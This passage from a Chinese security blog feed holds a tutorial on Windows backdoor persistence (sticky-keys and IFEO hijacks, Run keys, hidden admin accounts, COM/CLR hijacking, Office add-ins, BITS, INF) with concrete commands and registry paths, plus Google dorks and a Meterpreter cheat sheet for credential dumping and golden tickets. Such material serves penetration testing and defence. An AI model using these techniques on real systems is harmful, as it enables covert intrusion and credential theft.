</span><br><span class="line">site:XXX.com filetype:doc  </span><br><span class="line"></span><br><span class="line">4. 收集Discuz论坛主机  </span><br><span class="line">intext:Powered by Discuz  </span><br><span class="line"></span><br><span class="line">5. 收集某网站的Google快照  </span><br><span class="line">cache:XXX.com  </span><br><span class="line"></span><br><span class="line">6. 搜索某网站的公共FTP用户  </span><br><span class="line">site:XXX.com intext:ftp://*:*</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows后门持久化</title>
      <link href="/2019/10/07/windows%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2019/10/07/windows%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="windows后门持久化"><a href="#windows后门持久化" class="headerlink" title="windows后门持久化"></a>windows后门持久化</h2><p>原文链接：<br><a href="https://xz.aliyun.com/t/6461#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/6461#toc-11</a></p><p>shift后门<br>映像劫持<br>注册表自启动项<br>定时任务<br>用户登陆初始化<br>Logon Scripts<br>屏幕保护程序<br>自启动服务<br>影子用户<br>waitfor<br>CLR<br>Hijack CAccPropServicesClass and MMDeviceEnumerator<br>劫持MruPidlList<br>office系列<br>Word WLL<br>Excel XLL<br>PowerPoint VBA add-ins<br>文件关联<br>AppInit_DLLs<br>Netsh helper<br>利用BITS<br>利用inf文件实现后门<br>后记  </p><h3 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h3><p>这个是比较老的方式了，这里简单讲一下，在windows中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\sethc.exe 粘滞键，启动快捷键：按五次shift键</span><br><span class="line">C:\Windows\System32\utilman.exe 设置中心，启动快捷键：Windows+U键</span><br></pre></td></tr></table></figure><p>在低版本的windows中，我们可以直接把setch.exe替换成我们的后门程序，下面我们把setch.exe替换为cmd.exe</p><h3 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h3><p>这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。</p><p>“映像劫持”，也被称为”IFEO”（Image File Execution Options）</p><p>就是Image File Execution Options（其实应该称为”image Hijack”。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。<br>PS：来自百度百科<br>简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序</p><p>操作也很简单，在注册表的HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option下添加一个项sethc.exe，然后在sethc.exe这个项中添加debugger键，键值为我们恶意程序的路径，如下图</p><h3 id="注册表自启动项"><a href="#注册表自启动项" class="headerlink" title="注册表自启动项"></a>注册表自启动项</h3><p>MSF的Persistence模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：Run和RunOnce，两者的区别如下</p><p>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</p><p>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</p><p>常见注册表启动项键的位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">用户级</span><br><span class="line"></span><br><span class="line">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">系统级</span><br><span class="line"></span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure><h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>windows下定时任务的命令有两个分别是：at和schtasks，他们两者主要区别是at命令在win7、08等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而schtasks是将定时的任务在前台执行，下面我们逐个看看</p><p>at的一些参数</p><p>AT [\computername] time [/INTERACTIVE]<br>    [ /EVERY:date[,…] | /NEXT:date[,…]] “command”</p><p>schtasks一些参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru &#123;[Domain\]User | &quot;System&quot;&#125; [/rp Password]] /?</span><br></pre></td></tr></table></figure><p>schtasks的执行如下：</p><h3 id="用户登陆初始化"><a href="#用户登陆初始化" class="headerlink" title="用户登陆初始化"></a>用户登陆初始化</h3><p>Userinit的作用是用户在进行登陆初始化设置时，WinLogon进程会执行指定的login scripts，所以我们可以修改它的键值来添加我们要执行的程序</p><p>注册表路径为：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit，我们添加一个我们启动的程序，多个程序用逗号隔开</p><h3 id="Logon-Scripts"><a href="#Logon-Scripts" class="headerlink" title="Logon Scripts"></a>Logon Scripts</h3><p>Logon Scripts优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p><p>注册表路径为：HKEY_CURRENT_USER\Environment，创建一个键为：UserInitMprLogonScript，其键值为我们要启动的程序路径</p><h3 id="屏幕保护程序"><a href="#屏幕保护程序" class="headerlink" title="屏幕保护程序"></a>屏幕保护程序</h3><p>在对方开启屏幕保护的情况下，我们可以修改屏保程序为我们的恶意程序从而达到后门持久化的目的<br>其中屏幕保护的配置存储在注册表中，其位置为：HKEY_CURRENT_USER\Control Panel\Desktop，关键键值如下：</p><p>SCRNSAVE.EXE - 默认屏幕保护程序，我们可以把这个键值改为我们的恶意程序</p><p>ScreenSaveActive - 1表示屏幕保护是启动状态，0表示表示屏幕保护是关闭状态</p><p>ScreenSaverTimeout - 指定屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900（15分钟）</p><h3 id="自启动服务"><a href="#自启动服务" class="headerlink" title="自启动服务"></a>自启动服务</h3><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务</p><p>为了方便起见我们可以直接用Metasploit来注册一个服务</p><p>meterpreter &gt; run metsvc -A</p><p>运行之后msf会在%TMP%目录下创建一个随机名称的文件夹，然后在该文件夹里面生成三个文件：metsvc.dll、metsvc-server.exe、metsvc.exe</p><p>同时会新建一个服务，其显示名称为Meterpreter，服务名称为metsvc，启动类型为”自动”，默认绑定在31337端口。</p><p>如果想删除服务，可以执行</p><p>meterpreter &gt; run metsvc -r</p><h3 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h3><p>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式是找不到这个用户的信息的</p><p>在用户名后面加一个$可以创建一个匿名用户，创建完毕后我们再把这个用户添加到administrator组</p><p>net user test$ test /add<br>net localgroup administrators test$ /add<br>可以看到net user是看不到我们创建的用户，但是计算机管理-用户和组中可以看到</p><p>所以这时候我们就需要修改一下注册表，其键位置为：HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</p><p>注意：SAM键值默认是只能system权限修改的，所以我们要修改一下SAM键的权限，给予administrator完全控制和读取的权限</p><p>然后我们将administrator用户对应的项中的F值复制到test$对应xiang中的F值，然后保存</p><p>然后我们将test$删除掉</p><p>net user test$ /del<br>然后再双击导出的注册表文件，然后我们再看一下</p><p>net user和计算机管理-用户和组中都查看不到用户了，但是我们可以用net user test$查看用户信息</p><p>这个时候我们再用net user test$ /del是删除不掉这个用户的，只能通过注册表来删除。</p><p>waitfor<br>关于waitfor手册中是这么解释的：</p><p>在系统上发送或等待信号。waitfor可用于跨网络同步计算机。<br>waitfor的语法</p><p>waitfor [/s <computer> [/u [<domain>]<user> [/p [<password>]]]] /si <signalname><br>waitfor [/t <timeout>] <signalname><br>参数解释：</signalname></timeout></signalname></password></user></domain></computer></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/s &lt;Computer&gt;  指定远程计算机的名称或IP地址，默认为本地计算机</span><br><span class="line">/u [&lt;Domain&gt;]&lt;user&gt;    使用指定用户帐户的凭据运行脚本。默认是使用当前用户的凭据。</span><br><span class="line">/p &lt;Password&gt;  指定/u参数中指定的用户帐户的密码。</span><br><span class="line">/si            发送指定激活信号。</span><br><span class="line">/t             指定等待信号的秒数。默认为无限期等待。 </span><br><span class="line">&lt;SignalName&gt;    指定等待或发送的信号，不区分大小写，长度不能超过225个字符</span><br></pre></td></tr></table></figure><p>我们来测试一下看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waitfor test &amp;&amp; calc 表示接收信号成功后执行计算器   </span><br><span class="line">waitfor /s 192.168.163.143 /u qiyou /p qiyou /si test</span><br></pre></td></tr></table></figure><p>但是这样只能执行一次，这对我们后门持久化很不利，所以我们得想办法让它持久化。</p><p>这里就要借用一下三好师傅的powershell脚本：<a href="https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1" target="_blank" rel="noopener">https://github.com/3gstudent/Waitfor-Persistence/blob/master/Waitfor-Persistence.ps1</a></p><p>该方法的优点就是能主动激活，但是缺点也明显就是只能在同一网段才能接收和发送激活信号、服务器重启之后就不行了。</p><h3 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h3><p>CLR的简述（来自百度百科）</p><p>CLR(公共语言运行库,Common Language Runtime)和Java虚拟机一样也是一个运行时环境，是一个可由多种编程语言使用的运行环境。CLR的核心功能包括：内存管理、程序集加载、安全性、异常处理和线程同步，可由面向CLR的所有语言使用。并保证应用和底层操作系统之间必要的分离。CLR是.NET Framework的主要执行引擎。<br>需要注意的是CLR能够劫持系统中全部.net程序，而且系统默认会调用.net程序，从而导致我们的后门自动触发，这是我们后门持久化的一个好的思路，下面来实现一下</p><p>修改一下注册表，注册表路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Classes\CLSID\，新建子项&#123;11111111-1111-1111-1111-111111111111&#125;（名字随便，只要不与注册表中存在的名称冲突就行），然后再新建子项InProcServer32，新建一个键ThreadingModel，键值为：Apartment，默认的键值为我们dll的路径</span><br></pre></td></tr></table></figure><p>然后在cmd下设置一下：<br>PS：要注册为全局变量，不然只能在当前cmd窗口劫持.net程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SETX COR_ENABLE_PROFILING=1 /M</span><br><span class="line">SETX COR_PROFILER=&#123;11111111-1111-1111-1111-111111111111&#125; /M</span><br></pre></td></tr></table></figure><p>然后执行一波，效果如下，可以看到已经成功劫持了</p><h3 id="Hijack-CAccPropServicesClass-and-MMDeviceEnumerator"><a href="#Hijack-CAccPropServicesClass-and-MMDeviceEnumerator" class="headerlink" title="Hijack CAccPropServicesClass and MMDeviceEnumerator"></a>Hijack CAccPropServicesClass and MMDeviceEnumerator</h3><p>什么是COM（来自WIKI）</p><p>组件对象模型（英语：Component Object Model，缩写COM）是微软的一套软件组件的二进制接口标准。这使得跨编程语言的进程间通信、动态对象创建成为可能。COM是多项微软技术与框架的基础，包括OLE、OLE自动化、ActiveX、COM+、DCOM、Windows shell、DirectX、Windows Runtime。<br>这个和CRL劫持.NET程序类似，也是通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator的劫持，而系统很多正常程序启动时需要调用这两个实例，所以这个很适合我们的后门持久化。</p><p>经测试貌似64位系统下不行（或许是我姿势的问题），但是32位系统下可以，下面说一下32位系统利用方法：</p><p>在%APPDATA%\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}\下放入我们的后门dll，重命名为test._dl</p><p>PS：如果Installer文件夹不存在，则依次创建Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}</p><p>然后就是修改注册表了，在注册表位置为：HKCU\Software\Classes\CLSID\下创建项{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，然后再创建一个子项InprocServer32，默认为我们的dll文件路径：C:\Users\qiyou\AppData\Roaming\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}，再创建一个键ThreadingModel，其键值为：Apartment</p><p>然后就是测试了，打开iexplore.exe，成功弹框</p><p>PS：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass，{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator</p><h3 id="劫持MruPidlList"><a href="#劫持MruPidlList" class="headerlink" title="劫持MruPidlList"></a>劫持MruPidlList</h3><p>在注册表位置为HKCU\Software\Classes\CLSID\下创建项{42aedc87-2188-41fd-b9a3-0c966feabec1}，再创建一个子项InprocServer32，默认的键值为我们的dll路径，再创建一个键ThreadingModel，其键值：Apartment</p><p>该注册表对应COM对象MruPidlList，作用于shell32.dll，而shell32.dll是Windows的32位外壳动态链接库文件，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。其中explorer.exe会调用shell32.dll，然后会加载COM对象MruPidlList，从而触发我们的dll文件</p><p>当用户重启时或者重新创建一个explorer.exe进程时，就会加载我们的恶意dll文件，从而达到后门持久化的效果。这里我们直接结束一个explorer.exe进程再起一个进程来看一下效果</p><h3 id="office系列"><a href="#office系列" class="headerlink" title="office系列"></a>office系列</h3><h4 id="Word-WLL"><a href="#Word-WLL" class="headerlink" title="Word WLL"></a>Word WLL</h4><p>把dll文件保存在%APPDATA%\Microsoft\Word\Startup，然后把后缀名改为wll<br>PS：Startup支持启动多个wll<br>打开word，成功弹框</p><h4 id="Excel-XLL"><a href="#Excel-XLL" class="headerlink" title="Excel XLL"></a>Excel XLL</h4><p>Excel dll的编写可以参考三好师傅这个项目：链接<br><a href="https://github.com/3gstudent/Add-Dll-Exports" target="_blank" rel="noopener">https://github.com/3gstudent/Add-Dll-Exports</a><br>用三好师傅powershell脚本生成现成的Excel dll：<br><a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="noopener">https://github.com/3gstudent/Office-Persistence</a><br>将生成的DLL文件复制到%appdata%\Microsoft\AddIns目录下，然后再修改一下注册表，office版本对应的注册表位置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">office2003 — HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\</span><br><span class="line">office2007 — HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\</span><br><span class="line">office2010 — HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\</span><br><span class="line">office2013 — HKEY_CURRENT_USER\Software\Microsoft\Office\15.0\</span><br><span class="line">office2016 — HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\</span><br></pre></td></tr></table></figure><p>我这里使用的2010的，所以我们要修改的是HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Options，添加一个键OPEN，键值为：/R test.dll</p><p>然后打开Excel，发现成功弹出计算器</p><h4 id="PowerPoint-VBA-add-ins"><a href="#PowerPoint-VBA-add-ins" class="headerlink" title="PowerPoint VBA add-ins"></a>PowerPoint VBA add-ins</h4><p>用三好师傅powershell脚本生成现成的PowerPoint dll：链接<br><a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="noopener">https://github.com/3gstudent/Office-Persistence</a>  </p><p>将生成的DLL文件复制到%appdata%\Microsoft\AddIns目录下，然后参考前面我给出的office版本对应的注册表位置，在HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\PowerPoint下新建一个子项：AddIns，然后在AddIns下面新建一个子项test，新建一个键为Autoload，类型为DWORD，键值为：1；新建一个键为Path，类型为SZ，键值为我们dll文件的路径</p><p>打开PowerPoint成功弹出计算器</p><h3 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h3><p>什么是文件关联</p><p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系。一个文件可以与多个应用程序发生关联。可以利用文件的“打开方式”进行关联选择。<br>举个例子来说，位图文件（BMP文件）在Windows中的默认关联程序是“图片”，如果将其默认关联改为用ACDSee程序来打开，那么ACDSee就成了它的默认关联程序。<br>PS：来自百度百科<br>我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联</p><p>我们可以用ftype命令显示或修改用在文件扩展名关联中的文件类型</p><h3 id="相关注册表"><a href="#相关注册表" class="headerlink" title="相关注册表"></a>相关注册表</h3><p>HKEY_CURRENT_USER\Software\Classe    //保存了当前用户的类注册和文件扩展名信息<br>HKEY_LOCAL_MACHINE\Software\Classe   //保存了系统所有用户用户的类注册和文件扩展名信息<br>HKEY_CLASS_ROOT                      //HKEY_CLASSES_ROOT项提供合并来自上面两个的信息的注册表的视图<br>我们以.txt为例，通过文件关联来修改它默认打开的程序。<br>修改\HKEY_CLASS_ROOT\txtfile\shell\open\command的默认值为我们要执行的程序  </p><h3 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h3><p>User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，如果有值，调用LoadLibrary() api加载用户dll。</p><p>其注册表位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs，把AppInit_DLLs的键值设置为我们dll路径，将LoadAppInit_DLLs设置为1</p><h3 id="Netsh-helper"><a href="#Netsh-helper" class="headerlink" title="Netsh helper"></a>Netsh helper</h3><p>netsh（全称：Network Shell） 是windows系统本身提供的功能强大的网络配置命令行工具，它可以添加自定的dll从而拓展其功能，我们可以使用netsh add helper yourdll.dll来添加拓展功能，添加了之后，在启动netsh的时候就会加载我们dll文件</p><p>添加自定义helper dll<br>我们可以使用两种方式来添加helper：<br>通过cmd添加helper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper test.dll</span><br></pre></td></tr></table></figure><p>通过注册表添加helper<br>其位置为：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh，创建一个键，名称随便，键值为我们dll的路径</p><h3 id="利用BITS"><a href="#利用BITS" class="headerlink" title="利用BITS"></a>利用BITS</h3><p>BITS (后台智能传送服务) 是一个 Windows 组件，它可以在前台或后台异步传输文件，为保证其他网络应用程序获得响应而调整传输速度，并在重新启动计算机或重新建立网络连接之后自动恢复文件传输。</p><p>bitsadmin是一个命令行工具，用于创建下载或上传任务并监视其进度。你可以执行bitsadmin /?或bitsadmin /HELP获取帮助列表。</p><p>常见的bitsadmin命令</p><p>bitsadmin /create [type] DisplayName //创建一个任务<br>bitsadmin /cancel <job> //删除一个任务<br>bitsadmin /list /allusers /verbose //列出所有任务<br>bitsadmin /AddFile <job> <remoteurl> <localname> //给任务test添加一个下载文件<br>bitsadmin /SetNotifyCmdLine <job> <programname>   [ProgramParameters] //设置在任务完成传输时或任务进入状态时将运行的命令行命令。<br>bitsadmin /Resume <job> //激活传输队列中的新任务或挂起的任务。<br>bitsadmin /cancel <job> //删除某个任务<br>bitsadmin /reset /allusers //删除所有任务<br>bitsadmin /complete <job> //完成某个任务<br>下面我们来测试一下：</job></job></job></programname></job></localname></remoteurl></job></job></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create test</span><br><span class="line">bitsadmin /addfile test c:\windows\system32\calc.exe c:\Users\qiyou\Desktop\calc.exe //为了方便起见我们直接复制本地文件</span><br><span class="line">bitsadmin /SetNotifyCmdLine test cmd.exe &quot;cmd.exe /c calc.exe&quot;</span><br><span class="line">bitsadmin /resume test</span><br></pre></td></tr></table></figure><p>重启电脑之后任务还是存在</p><p>如果我们想让任务完成，可以执行bitsadmin /complete test，calc.exe也会复制到桌面上</p><h3 id="利用inf文件实现后门"><a href="#利用inf文件实现后门" class="headerlink" title="利用inf文件实现后门"></a>利用inf文件实现后门</h3><p>inf文件</p><p>INF文件或安装信息文件是Microsoft Windows用于安装软件和驱动程序的纯文本文件。INF文件最常用于安装硬件组件的设备驱动程序。Windows包含用于创建基于INF的安装的IExpress工具。INF文件是Windows安装程序API及其后续版本Windows Installer的一部分。<br>PS：来自WIKI<br>inf文件的结构<br>想了解更多可以看一下微软的手册：<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc939869(v=technet.10)#information-inf-file-entries</a></p><ol><li><p>DefaultInstall节（来自WIKI）<br>INF文件的结构与INI文件的结构非常类似; 它包含用于指定要复制的文件，对注册表的更改等的各个部分。所有INF文件都包含一个[Version]带有Signature 键值对的部分，用于指定INF文件所针对的Windows版本。签名通常是$CHICAGO$（对于Windows 9x）或$WINDOWS NT$（对于Windows NT / 2K / XP）。其余大多数部分是用户定义的，并且包含特定于要安装的组件的信息。</p></li><li><p>DefaultInstall节（来自微软的手册）<br> RunPreSetupCommands-本节中指定的命令在安装服务配置文件之前运行。<br> RunPostSetupCommands-本节中指定的命令在安装程序完成服务配置文件后运行。<br> RunPreUnInstCommands-本节中指定的命令在卸载程序开始之前运行。<br> RunPostUnInstCommands-本节中指定的命令在卸载程序运行后运行。<br>下面举一个calc.inf弹计算器的例子<br><code>[Version]Signature=&quot;$CHICAGO$&quot;AdvancedINF=2.5,&quot;test&quot;[DefaultInstall]RunPreSetupCommands=Command1[Command1]C:\windows\system32\calc.exe</code><br>命令行下执行：</p></li></ol><p><code>rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">后门实现：</span><br><span class="line">在注册表HKEY_CURRENT_USER\Software\Microsoft\处依次新建子项\IEAK\GroupPolicy\PendingGPOs，然后再新建几个键，如下：</span><br><span class="line">键：Count，类型：REG_DWORD，键值：1</span><br><span class="line">键：Path1，类型：REG_SZ，键值：C:\Users\Administrator\Desktop\test\calc.inf //这个为我们inf文件的路径，这里以上面那个inf文件例子为例</span><br><span class="line">键：Section1，类型：REG_SZ，键值：DefaultInstall</span><br></pre></td></tr></table></figure><p>重启电脑之后成功弹出计算器<br>但是重启之后PendingGPOs该项就会被清除，需要我们重新修改注册表</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>以上就是我所总结后门持久化的所有内容了，当然还有很多方法没有在文章内提及，虽然有的方法都是老生常谈的了，但是还是在一些实战环境中屡试不爽，有一句话说的好（这句话忘记是哪位师傅说的了=。=）：知识面宽度决定攻击面广度，知识链深度决定攻击链的长度</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Meterpreter扩展速查表</title>
      <link href="/2019/10/07/Meterpreter%E6%89%A9%E5%B1%95%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2019/10/07/Meterpreter%E6%89%A9%E5%B1%95%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="一、Espia、Winpmem、Peinjector、Unhook、Sniffer-Commands"><a href="#一、Espia、Winpmem、Peinjector、Unhook、Sniffer-Commands" class="headerlink" title="一、Espia、Winpmem、Peinjector、Unhook、Sniffer Commands"></a>一、Espia、Winpmem、Peinjector、Unhook、Sniffer Commands</h4><p>screengrab：尝试从活动进程获取本地桌面屏幕截图<br>dump_ram：转储受害者RAM<br>injectpe：将shellcode注入指定的可执行文件<br>unhook_pe：取消当前进程<br>sniffer_dump：将捕获的数据包数据检索到PCAP文件<br>sniffer_interfaces：枚举所有可嗅探的网络接口<br>sniffer_release：在特定接口上释放捕获的数据包<br>sniffer_start：在特定接口上启动数据包捕获<br>sniffer_stats：查看活动捕获的统计信息<br>sniffer_stop：在特定接口上停止数据包捕获  </p><h4 id="二、Lanattacks-DHCP、TFTP-Commands"><a href="#二、Lanattacks-DHCP、TFTP-Commands" class="headerlink" title="二、Lanattacks: DHCP、TFTP Commands"></a>二、Lanattacks: DHCP、TFTP Commands</h4><p>dhcp_load_options：从数据存储区加载DHCP选项<br>dhcp_log：记录DHCP服务器活动<br>dhcp_reset：重置DHCP服务器<br>dhcp_set_option ：设置DHCP服务器选项<br>dhcp_start：启动DHCP服务器<br>dhcp_stop：停止DHCP服务器<br>tftp_add_file：将文件添加到TFTP服务器<br>tftp_reset：重置TFTP服务器<br>tftp_start：启动TFTP服务器<br>tftp_stop：停止TFTP服务器  </p><h4 id="三、Python、Powershell-Commands"><a href="#三、Python、Powershell-Commands" class="headerlink" title="三、Python、Powershell Commands"></a>三、Python、Powershell Commands</h4><p>python_execute：执行python命令字符串<br>python_import：导入/运行python文件或模块<br>python_reset：重置/重新启动Python解释器<br>powershell_execute：执行Powershell命令字符串<br>powershell_import：导入PS1脚本或.NET程序集DLL<br>powershell_shell：创建交互式Powershell命令行  </p><h4 id="四、Incognito、Mimikatz、Kiwi-Commands"><a href="#四、Incognito、Mimikatz、Kiwi-Commands" class="headerlink" title="四、Incognito、Mimikatz、Kiwi Commands"></a>四、Incognito、Mimikatz、Kiwi Commands</h4><p>add_group_user：将用户添加到远程主机上的全局组<br>add_localgroup_user：将用户添加到远程主机上的本地组<br>add_user：将用户添加到远程主机<br>impersonate_token：模拟指定用户或组的令牌<br>list_tokens：列出所有可用的用户和组的令牌<br>snarf_hashes：每个令牌的Snarf challenge/response哈希值<br>kerberos：尝试检索kerberos creds<br>livessp：尝试检索livessp creds<br>mimikatz_command：运行自定义命令<br>msv：尝试检索msv creds<br>ssp：尝试检索ssp creds<br>tspkg：尝试检索tspkg creds<br>wdigest：尝试检索wdigest creds<br>creds_all ：检索所有凭据（已解析）<br>creds_kerberos：检索Kerberos creds（解析）<br>creds_msv ：检索LM/NTLM creds（解析）<br>creds_ssp：检索SSP creds<br>creds_tspkg：检索TsPkg creds（解析）<br>creds_wdigest：检索WDigest creds（解析）<br>dcsync：通过DCSync检索用户帐户信息（未解析）<br>dcsync_ntlm：通过DCSync检索用户帐户NTLM哈希，SID和RID<br>golden_ticket_create：创建一张kerberos黄金票据<br>kerberos_ticket_list：列出所有kerberos票据<br>kerberos_ticket_purge：清除任何正在使用的kerberos票据<br>kerberos_ticket_use：使用kerberos票据<br>kiwi_cmd：执行一个任意的mimikatz命令（未解析）<br>lsa_dump_sam：转储LSA SAM（未解析）<br>lsa_dump_secrets：转储LSA秘密（未解析）<br>password_change：更改用户的密码/哈希值<br>wifi_list：列出当前用户的wifi配置文件/凭据<br>wifi_list_shared：列出共享的wifi配置文件/凭据  </p><h4 id="五、Extapi：Window、Service、ClipboardADSI、WMI-Management-Commands"><a href="#五、Extapi：Window、Service、ClipboardADSI、WMI-Management-Commands" class="headerlink" title="五、Extapi：Window、Service、ClipboardADSI、WMI Management Commands"></a>五、Extapi：Window、Service、ClipboardADSI、WMI Management 